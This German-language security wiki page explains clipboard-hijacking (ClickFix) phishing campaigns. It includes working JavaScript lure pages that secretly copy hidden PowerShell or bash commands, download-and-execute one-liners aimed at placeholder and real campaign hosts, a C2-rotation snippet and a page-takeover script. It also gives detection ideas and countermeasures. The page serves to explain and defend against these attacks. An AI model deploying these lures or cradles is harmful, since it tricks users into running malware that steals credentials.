# Clipboard Hijacking (Pastejacking) Angriffe

{{#include ../../banners/hacktricks-training.md}}

> „Füge niemals etwas ein, das du nicht selbst kopiert hast.“ – alter, aber immer noch gültiger Rat

## Übersicht

Clipboard hijacking – auch bekannt als *pastejacking* – missbraucht die Tatsache, dass Benutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu prüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) legt programmgesteuert vom Angreifer kontrollierten Text in die system clipboard. Opfer werden normalerweise durch sorgfältig gestaltete Social‑Engineering‑Anweisungen ermutigt, **Win + R** (Ausführen-Dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den clipboard‑Inhalt einzufügen, wodurch beliebige Befehle sofort ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Content-Sicherheitskontrollen, die Anhänge, Makros oder direkte Befehlsausführung überwachen. Der Angriff ist daher beliebt in Phishing-Kampagnen, die Commodity‑Malware‑Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer liefern.

## Forced copy buttons and hidden payloads (macOS one-liners)

Einige macOS infostealers klonen Installer‑Seiten (z. B. Homebrew) und **erzwingen die Verwendung einer „Copy“-Schaltfläche**, sodass Benutzer den sichtbaren Text nicht nur markieren können. Der clipboard‑Eintrag enthält den erwarteten Installer‑Befehl plus eine angehängte Base64‑Payload (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einziges Einfügen beide Stufen ausführt, während die UI die zusätzliche Stufe verbirgt.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Ablauf von ClickFix / ClearFake

1. Der Benutzer besucht eine typosquatted oder kompromittierte Website (z. B. `docusign.sa[.]com`)
2. Eingespritztes **ClearFake** JavaScript ruft einen `unsecuredCopyToClipboard()`-Helper auf, der stillschweigend einen Base64-kodierten PowerShell-Einzeiler in die Zwischenablage speichert.
3. HTML-Anweisungen sagen dem Opfer: *“Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu beheben.”*
4. `powershell.exe` führt aus und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt weitere Stufen, injiziert shellcode und installiert Persistenz (z. B. scheduled task) – und führt schließlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Beispiel NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL ermittelt dynamisch APIs mit **GetProcAddress**, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) via **curl.exe** herunter, entschlüsselt sie mithilfe eines rollenden XOR-Schlüssels `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript downloader in **cscript.exe** aus
3. Lädt ein MSI payload → drops `libcef.dll` neben einer signierten Anwendung → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verstecktes PowerShell-Skript, das `PartyContinued.exe` lädt, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mittels `extrac32` und Dateizusammenfügung rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das browser credentials an `sumeriavgv.digital` exfiltriert.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Dateidownloads und fordern Opfer auf, einen one‑liner einzufügen, der JavaScript via WSH abruft und ausführt, persistiert und den C2 täglich rotiert. Beobachtete Beispielkette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Hauptmerkmale
- Verschleierte URL, zur Laufzeit umgekehrt, um eine oberflächliche Inspektion zu umgehen.
- JavaScript persistiert sich selbst über einen Startup LNK (WScript/CScript) und wählt den C2 anhand des aktuellen Tages – ermöglicht schnelle Domain-Rotation.

Minimales JS-Fragment, das zur Rotation der C2s nach Datum verwendet wird:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die nächste Stufe setzt üblicherweise einen Loader ein, der Persistenz herstellt und einen RAT (z. B. PureHVNC) nachlädt, oft TLS an ein fest kodiertes Zertifikat bindet und den Traffic in Stücke aufteilt.

Detection ideas specific to this variant
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Autostart-Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, die WScript/CScript mit einem JS-Pfad unter `%TEMP%`/`%APPDATA%` aufruft.
- Registry/RunMRU- und Kommandozeilen‑Telemetrie, die `.split('').reverse().join('')` oder `eval(a.responseText)` enthält.
- Wiederholte `powershell -NoProfile -NonInteractive -Command -` mit großen stdin‑Payloads, um lange Skripte ohne lange Command‑Lines einzuspeisen.
- Geplante Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` ausführen, unter einem wie Updater wirkenden Task/Pfad (z. B. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Täglich rotierende C2-Hostnamen und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korreliere clipboard-Write‑Ereignisse, gefolgt von Win+R‑Einfügen und anschließender sofortiger Ausführung von `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hält eine Historie von **Win + R**-Befehlen – suche nach ungewöhnlichen Base64 / obfuskaten Einträgen.
* Security Event ID **4688** (Process Creation), wenn `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** für Datei-Erstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder temporären Ordnern kurz vor dem verdächtigen 4688‑Ereignis.
* EDR clipboard sensors (falls vorhanden) – korreliere `Clipboard Write`, gefolgt unmittelbar von einem neuen PowerShell‑Prozess.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen massenproduzieren gefälschte CDN/Browser‑Verifizierungsseiten ("Just a moment…", IUAM-style), die Benutzer dazu bringen, OS‑spezifische Befehle aus ihrer clipboard in native Konsolen einzufügen. Dadurch wird die Ausführung aus der Browser‑Sandbox heraus verlagert und funktioniert unter Windows und macOS.

Key traits of the builder-generated pages
- OS‑Erkennung via `navigator.userAgent`, um Payloads anzupassen (Windows PowerShell/CMD vs. macOS Terminal). Optionale Decoys/No‑Ops für nicht unterstützte OS, um die Illusion aufrechtzuerhalten.
- Automatisches clipboard‑Copy bei harmlosen UI‑Aktionen (Checkbox/Copy), während der sichtbare Text vom clipboard‑Inhalt abweichen kann.
- Mobile‑Blocking und ein Popover mit Schritt‑für‑Schritt‑Anweisungen: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optionale Obfuskation und Single‑File‑Injector, um das DOM einer kompromittierten Seite mit einer Tailwind‑gestylten Verifizierungs‑UI zu überschreiben (keine neue Domain‑Registrierung erforderlich).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS Persistenz des initialen Laufs
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und sichtbare Artefakte reduziert werden.

In-place page takeover auf kompromittierten Sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Erkennungs- & Hunting-Ideen speziell für IUAM-style lures
- Web: Seiten, die Clipboard API an Verifizierungs-Widgets binden; Diskrepanz zwischen angezeigtem Text und Clipboard-Payload; `navigator.userAgent`-Branching; Tailwind + Single-Page-Austausch in verdächtigen Kontexten.
- Windows endpoint: `explorer.exe` → kurz nach einer Browser-Interaktion `powershell.exe`/`cmd.exe`; Batch/MSI-Installer, die aus `%TEMP%` ausgeführt werden.
- macOS endpoint: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` im Zusammenhang mit Browser-Ereignissen; Hintergrundjobs, die das Schließen des Terminals überleben.
- Korrelieren Sie `RunMRU` Win+R-Historie und Clipboard-Schreibvorgänge mit anschließender Erstellung von Konsolenprozessen.

Siehe auch unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 Fake-CAPTCHA / ClickFix-Entwicklungen (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Sites und injiziert Loader-JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) und sogar Blockchain-"etherhiding"-Aufrufe (z. B. POSTs an Binance Smart Chain API-Endpunkte wie `bsc-testnet.drpc[.]org`) kettet, um die aktuelle lure-Logik zu ziehen. Neuere Overlays verwenden stark Fake-CAPTCHAs, die Benutzer anweisen, statt etwas herunterzuladen einen One-Liner zu kopieren/einzufügen (T1204.004).
- Die initiale Ausführung wird zunehmend an signierte Script-Hosts/LOLBAS delegiert. Die Ketten vom Januar 2026 tauschten die frühere Nutzung von `mshta` gegen das eingebaute `SyncAppvPublishingServer.vbs` aus, das über `WScript.exe` ausgeführt wird und PowerShell-ähnliche Argumente mit Aliases/Wildcards übergibt, um remote content zu laden:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; gepaart mit `WScript.exe` und ungewöhnlichen Argumenten (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) wird es zu einer stark aussagekräftigen LOLBAS-Stufe für ClearFake.
- Im Februar 2026 kehrten fake CAPTCHA payloads wieder zu reinen PowerShell download cradles zurück. Zwei Live-Beispiele:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die erste Kette ist ein in-memory `iex(irm ...)` grabber; die zweite stages via `WinHttp.WinHttpRequest.5.1`, schreibt eine temporäre `.ps1` und startet sie mit `-ep bypass` in einem versteckten Fenster.

Detection/Hunting-Tipps für diese Varianten
- Prozesslinie: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell cradles unmittelbar nach clipboard writes/Win+R.
- Kommandozeilen-Schlüsselwörter: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Netzwerk: ausgehender Traffic zu CDN worker hosts oder blockchain RPC endpoints von script hosts/PowerShell kurz nach Web-Browsing.
- Datei/Registry: temporäre `.ps1`-Erstellung unter `%TEMP%` sowie RunMRU-Einträge, die diese one-liners enthalten; sperren/Alarmieren bei signed-script LOLBAS (WScript/cscript/mshta), die mit externen URLs oder obfuskierten Alias-Strings ausgeführt werden.

## Gegenmaßnahmen

1. Browser-Härtung – Clipboard write-access deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder eine Benutzeraktion erzwingen.
2. Security awareness – Benutzer anleiten, sensitive Commands zu tippen oder sie zuerst in einen Texteditor zu paste.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige one-liners zu blockieren.
4. Netzwerk-Kontrollen – ausgehende Requests zu bekannten pastejacking- und Malware C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** nutzt oft denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
